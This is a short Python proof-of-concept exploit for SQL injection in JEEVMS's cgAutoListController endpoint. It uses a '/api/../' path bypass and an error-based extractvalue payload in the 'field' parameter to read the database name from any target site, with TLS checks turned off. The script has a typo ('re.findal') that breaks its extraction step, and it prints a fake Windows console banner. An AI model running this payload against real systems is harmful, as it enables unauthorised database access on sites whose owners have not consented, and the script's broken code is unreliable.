#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib3

urllib3.disable_warnings()

def verify(site):
    payload = 'extractvalue(1,concat(char(126),database()))'
    path = "/api/../cgAutoListController.do?datagrid&configId=jform_contact&field=" + payload
    url = site + path
    headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/101.0.4951.64 Safari/537.36",
                'Content-Type':'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
    }
    data = 'page=1&rows=10&sort=create_date&order=desc'
    resp = requests.post(url=url, headers=headers,data=data, verify=False, timeout=20)
    if "XPATH" in resp.text:
        return re.findal("XPATH syntax error: '~([^']+)'", resp.text, re.I)[0]
    return ""
    

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 JEEVMS-cgAutoListController-sqli.py ",target)
    data = verify(target)
    if data:
        print("[+]漏洞存在，当前数据库名称为：", data)
    else:
        print("[-]漏洞不存在")
